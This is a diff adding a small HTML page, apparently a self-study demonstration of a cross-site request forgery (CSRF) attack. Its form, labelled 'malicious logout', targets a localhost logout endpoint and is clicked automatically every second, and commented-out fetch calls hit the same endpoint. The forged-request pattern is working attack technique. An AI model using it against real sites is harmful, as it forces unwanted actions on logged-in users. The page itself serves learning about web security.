@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <link rel="stylesheet" href="http://127.0.0.1:3000/logout"> -->
+    <title>Document</title>
+</head>
+<body>
+    csrf攻击
+
+    <form action="http://127.0.0.1:3000/logout" method="post" id="melicious-form">
+        <button type="submit" id="melicious-click">恶意登出</button>
+    </form>
+
+
+    <script>
+        let meliciousClick = document.getElementById('melicious-click');
+        let meliciousForm = document.getElementById('melicious-form');
+
+        meliciousForm.onsubmit = event => {
+            event.preventDefault();
+            console.log('submit！');
+        }
+
+        setInterval(() => {
+            meliciousClick.click();
+        },1000);
+        // fetch('http://127.0.0.1:3000/logout',{
+        //     method:'POST'
+        // }).then(resoponse => {
+        //     return response.text();
+        // }).then(res => {
+        //     console.log(res);
+        // }).catch(err => {
+        //     console.log(err);
+        // });
+
+        // fetch('http://127.0.0.1:3000/logout',{
+        //     method:'GET'
+        // }).then(resoponse => {
+        //     return response.text();
+        // }).then(res => {
+        //     console.log(res);
+        // }).catch(err => {
+        //     console.log(err);
+        // });
+    </script>
+</body>
+</html>
